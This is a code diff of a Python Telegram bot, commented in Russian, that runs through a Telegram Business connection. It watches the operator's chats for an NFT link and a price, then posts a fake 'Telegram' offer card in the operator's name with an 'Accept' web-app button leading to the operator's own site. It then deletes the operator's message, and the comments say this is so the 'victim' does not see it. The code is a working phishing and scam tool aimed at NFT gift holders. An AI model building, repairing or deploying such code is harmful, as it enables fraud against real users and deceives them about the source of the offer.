@@ -26,15 +26,15 @@ dp = Dispatcher()
 router = Router()
 dp.include_router(router)
 
-BUSINESS_CONNS: dict[int, str] = {}
+# Храним ID бизнес-подключения по ID владельца (тебя)
+BUSINESS_CONN_ID = None
 
 NFT_RE = re.compile(r"https?://t\.me/nft/([A-Za-z0-9_-]+)")
 PRICE_RE = re.compile(r"(\d+)\s*(gram|грам|звезд|star|stars|⭐)", re.I)
 
 def parse_nft(url: str):
     m = NFT_RE.search(url)
-    if not m:
-        return None
+    if not m: return None
     slug_raw = m.group(1)
     parts = slug_raw.rsplit("-", 1)
     if len(parts) == 2 and parts[1].isdigit():
@@ -47,51 +47,40 @@ def parse_nft(url: str):
 
 def parse_price(text: str):
     m = PRICE_RE.search(text)
-    if not m:
-        return None
-    amount = m.group(1)
-    unit = m.group(2).lower()
-    if unit in ("gram", "грам"):
-        return f"{amount} Gram"
-    return f"{amount} Stars"
+    if not m: return None
+    amount, unit = m.group(1), m.group(2).lower()
+    return f"{amount} Gram" if unit in ("gram", "грам") else f"{amount} Stars"
 
 
 # ==========================================
-# ГЛАВНЫЙ ОБРАБОТЧИК (Ловит любой текст)
+# ЛОВИМ ВСЁ В BUSINESS-ЧАТАХ
 # ==========================================
-@router.message(F.text)
 @router.business_message(F.text)
-async def handle_any_message(msg: Message):
-    # 1. Проверяем, что пишет именно АДМИН (ты)
+async def handle_business_message(msg: Message):
+    global BUSINESS_CONN_ID
+
+    # Если пишет не админ — игнорируем
     if msg.from_user and msg.from_user.id != ADMIN_ID:
         return
 
-    # 2. Если это личка с ботом (не бизнес-чат) — игнорируем обычный текст, 
-    # чтобы бот не спамил. Отвечаем только на /start
-    if msg.chat.type == ChatType.PRIVATE and not msg.reply_to_message:
-        # Если это не команда старт, проверяем есть ли ссылка. Если нет — молчим.
-        if not NFT_RE.search(msg.text):
-            return
-
-    # 3. Ищем ссылку и цену в тексте
+    # Ищем ссылку и цену
     nft = parse_nft(msg.text)
     price = parse_price(msg.text)
 
-    # Если нет ссылки или нет цены — бот ничего не делает (пропускает обычную болтовню)
     if not nft or not price:
-        return
+        return  # Обычная болтовня — пропускаем
 
-    log.info(f"Перехвачено сообщение: text={msg.text}, nft={nft['name']}, price={price}")
+    log.info(f"Перехват в бизнес-чате! nft={nft['name']}, price={price}")
 
-    # 4. Определяем, куда отправлять
     target_chat = msg.chat.id
-    target_user = msg.from_user.username if msg.from_user else "buyer"
+    target_user = msg.from_user.username or "buyer"
 
-    # 5. Создаем оффер в базе
+    # Создаем оффер
     oid = make_offer(
         nft_name=nft["name"], nft_slug=nft["slug"], price=price,
         buyer=target_user, target_user="target", target_chat_id=target_chat)
 
+    # Текст карточки
     text = (
         f"<b>Telegram</b>\n"
         f"<b>{nft['name']}</b>\n\n"
@@ -105,61 +94,58 @@ async def handle_any_message(msg: Message):
          InlineKeyboardButton(text="Принять", web_app=WebAppInfo(url=f"{BASE_URL}/offer/{oid}"))]
     ])
 
-    # 6. Отправляем карточку
     try:
-        conn_id = BUSINESS_CONNS.get(msg.chat.id) or next(iter(BUSINESS_CONNS.values()), None)
-        
-        if conn_id and msg.chat.type != ChatType.PRIVATE:
-            # Отправляем через Business (от твоего имени)
-            await bot.send_message(
-                chat_id=target_chat, text=text, reply_markup=kb, 
-                business_connection_id=conn_id
-            )
-            # УДАЛЯЕМ твой текст с ссылкой, чтобы жертва его не видела
-            try:
-                await bot.delete_message(chat_id=msg.chat.id, message_id=msg.message_id)
-            except Exception as e:
-                log.warning(f"Не смог удалить сообщение: {e}")
-        else:
-            # Если это просто личка с ботом для тестов
-            await bot.send_message(chat_id=target_chat, text=text, reply_markup=kb)
+        if not BUSINESS_CONN_ID:
+            log.error("Нет BUSINESS_CONN_ID! Бот не подключен к Business.")
+            return
 
+        # Отправляем через Business (от твоего имени)
+        await bot.send_message(
+            chat_id=target_chat, 
+            text=text, 
+            reply_markup=kb, 
+            business_connection_id=BUSINESS_CONN_ID
+        )
+        
+        # УДАЛЯЕМ твое сообщение с командой, чтобы жертва его не видела
+        try:
+            await bot.delete_message(chat_id=msg.chat.id, message_id=msg.message_id)
+        except Exception as e:
+            log.warning(f"Не смог удалить сообщение: {e}")
+            
     except Exception as e:
         log.error(f"Ошибка отправки: {e}")
-        await bot.send_message(chat_id=ADMIN_ID, text=f"❌ Ошибка: {e}")
+        # Отправим ошибку тебе в личку, чтобы ты видел
+        try:
+            await bot.send_message(chat_id=ADMIN_ID, text=f"❌ Ошибка: {e}")
+        except: pass
 
 
 # ==========================================
-# КОМАНДЫ ДЛЯ ТЕБЯ
-# ==========================================
-@router.message(Command("start"))
-async def cmd_start(msg: Message):
-    if msg.from_user.id != ADMIN_ID: return
-    await msg.reply("✅ Бот готов.\nПросто напиши в чат с жертвой ссылку и цену, например:\n<code>https://t.me/nft/MirageLamp-73768 155 GRAM</code>")
-
-@router.message(Command("ping"))
-async def cmd_ping(msg: Message):
-    if msg.from_user.id != ADMIN_ID: return
-    await msg.reply("🏓 Понг!")
-
-# ==========================================
-# СОБЫТИЯ
+# ПРИЕМ BUSINESS ПОДКЛЮЧЕНИЯ
 # ==========================================
 @router.business_connection()
 async def on_business_conn(conn: BusinessConnection):
-    BUSINESS_CONNS[conn.user.id] = conn.id
-    log.info(f"Business connection: user={conn.user.id} id={conn.id}")
+    global BUSINESS_CONN_ID
+    BUSINESS_CONN_ID = conn.id
+    log.info(f"✅ Business connection УСТАНОВЛЕН: user={conn.user.id} id={conn.id}")
 
+
+# ==========================================
+# ОТКЛОНЕНИЕ ОФФЕРА
+# ==========================================
 @router.callback_query(F.data.startswith("reject:"))
 async def on_reject(cb: CallbackQuery):
     oid = cb.data.split(":", 1)[1]
     try:
         await cb.message.edit_reply_markup(reply_markup=None)
-    except:
-        pass
+    except: pass
     await cb.answer("Отклонено")
 
 
+# ==========================================
+# ЗАПУСК
+# ==========================================
 async def main():
     log.info("Starting bot...")
     await dp.start_polling(bot)
